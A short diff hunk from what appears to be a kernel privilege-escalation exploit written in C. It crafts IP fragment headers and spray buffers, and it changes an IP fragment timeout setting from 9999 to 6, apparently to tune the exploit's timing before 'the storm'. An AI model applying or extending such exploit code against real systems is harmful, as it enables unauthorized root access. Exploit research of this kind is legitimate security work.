@@ -301,7 +301,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
 	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);
 
-	set_ipfrag_time(9999);
+	set_ipfrag_time(6);
 
 	printf("[*] waiting for the calm before the storm...\n");
 	sleep(CONFIG_SEC_BEFORE_STORM);
